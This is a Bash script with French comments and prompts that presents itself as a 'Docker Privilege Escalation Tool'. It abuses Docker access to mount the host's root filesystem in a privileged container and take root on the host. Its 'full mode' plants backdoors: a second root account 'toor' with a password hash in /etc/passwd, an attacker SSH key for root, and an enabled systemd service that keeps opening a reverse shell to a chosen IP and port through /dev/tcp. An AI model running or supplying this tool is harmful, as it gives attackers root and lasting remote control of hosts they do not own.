#!/bin/bash

# Couleurs pour une meilleure lisibilité
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration par défaut
DEFAULT_PORT=4444
DEFAULT_LHOST="10.10.14.X"

# Fonction pour afficher le banner
print_banner() {
    echo -e "${RED}"
    cat << "EOF"
╔═╗┬  ┬┬┬    ╔╦╗┌─┐┌─┐┬┌─┌─┐┬─┐
║╣ └┐┌┘││     ║║│ ││  ├┴┐├┤ ├┬┘
╚═╝ └┘ ┴┴─┘  ═╩╝└─┘└─┘┴ ┴└─┘┴└─
[*] Docker Privilege Escalation Tool v2.0
EOF
    echo -e "${NC}"
}

# Fonction pour vérifier si Docker est installé et accessible
check_docker() {
    if ! command -v docker &> /dev/null; then
        echo -e "${RED}[!] Docker n'est pas installé ou n'est pas accessible${NC}"
        exit 1
    fi
}

# Fonction pour lister toutes les images disponibles
list_images() {
    echo -e "${BLUE}[*] Images Docker disponibles :${NC}"
    docker image ls --format "table {{.ID}}\t{{.Repository}}:{{.Tag}}\t{{.Size}}"
}

# Fonction pour configurer le reverse shell
configure_revshell() {
    read -p "IP d'écoute [$DEFAULT_LHOST]: " LHOST
    read -p "Port d'écoute [$DEFAULT_PORT]: " LPORT
    
    LHOST=${LHOST:-$DEFAULT_LHOST}
    LPORT=${LPORT:-$DEFAULT_PORT}
    
    echo -e "${YELLOW}[+] Configuration du reverse shell: $LHOST:$LPORT${NC}"
    return 0
}

# Fonction pour ajouter plusieurs backdoors
add_backdoors() {
    local mount_point="/mnt"
    echo -e "${GREEN}[+] Installation des backdoors...${NC}"
    
    # Ajout d'utilisateur root
    echo -e "${BLUE}[*] Ajout d'un utilisateur root alternatif...${NC}"
    echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/bash' >> ${mount_point}/etc/passwd
    
    # Backdoor SSH
    echo -e "${BLUE}[*] Configuration SSH...${NC}"
    if [ -d "${mount_point}/root/.ssh" ]; then
        mkdir -p ${mount_point}/root/.ssh
        echo "ssh-rsa VOTRE_CLE_SSH" >> ${mount_point}/root/.ssh/authorized_keys
        chmod 600 ${mount_point}/root/.ssh/authorized_keys
    fi
    
    # Reverse Shell Service
    echo -e "${BLUE}[*] Installation du reverse shell persistant...${NC}"
    cat << EOF > ${mount_point}/etc/systemd/system/revshell.service
[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    
    if [ -x "${mount_point}/bin/systemctl" ]; then
        chroot ${mount_point} systemctl enable revshell
    fi
}

# Menu principal
main() {
    print_banner
    check_docker
    configure_revshell

    # Menu de sélection d'image
    while true; do
        echo -e "\n${BLUE}[*] Options disponibles:${NC}"
        echo "1. Voir les images disponibles"
        echo "2. Utiliser une image par ID"
        echo "3. Utiliser/télécharger une image par nom"
        echo "4. Quitter"
        read -p "Choix [1-4]: " choice

        case $choice in
            1)
                list_images
                continue
                ;;
            2)
                list_images
                read -p "Entrez l'ID de l'image: " image_id
                selected_image=$(docker image ls --format "{{.Repository}}:{{.Tag}}" | grep $image_id | head -n 1)
                break
                ;;
            3)
                read -p "Nom de l'image (ex: ubuntu:latest): " image_name
                if ! docker image inspect "$image_name" >/dev/null 2>&1; then
                    echo -e "${YELLOW}[!] Image non trouvée. Tentative de téléchargement...${NC}"
                    if docker pull "$image_name"; then
                        selected_image="$image_name"
                        break
                    else
                        echo -e "${RED}[!] Échec du téléchargement${NC}"
                        continue
                    fi
                fi
                selected_image="$image_name"
                break
                ;;
            4)
                echo -e "${RED}[!] Arrêt du script${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Option invalide${NC}"
                continue
                ;;
        esac
    done

    if [ -z "$selected_image" ]; then
        echo -e "${RED}[!] Aucune image sélectionnée${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Image sélectionnée: $selected_image${NC}"
    echo -e "${BLUE}[*] Mode d'exécution:${NC}"
    echo "1. Mode complet (toutes les options + backdoors)"
    echo "2. Mode minimal (uniquement --privileged)"
    read -p "Mode [1-2]: " mode

    echo -e "${YELLOW}[*] Démarrage du conteneur...${NC}"
    case $mode in
        1)
            docker run -it --rm \
                --pid=host \
                --net=host \
                --privileged \
                --cap-add=ALL \
                --security-opt seccomp=unconfined \
                -v /:/mnt \
                -v /dev:/dev \
                -v /proc:/proc \
                -v /sys:/sys \
                "$selected_image" /bin/bash -c "$(declare -f add_backdoors); cd /mnt && add_backdoors && chroot /mnt /bin/bash"
            ;;
        2)
            docker run -it --rm \
                --privileged \
                -v /:/mnt \
                "$selected_image" /bin/bash -c "
                chroot /mnt /bin/bash
                "
            ;;
        *)
            echo -e "${RED}[!] Mode invalide${NC}"
            exit 1
            ;;
    esac
}

# Gestion des arguments
if [ "$1" = "--help" ]; then
    echo "Usage: $0 [--help]"
    echo "Options:"
    echo "  --help    Affiche cette aide"
    exit 0
fi

main "$@"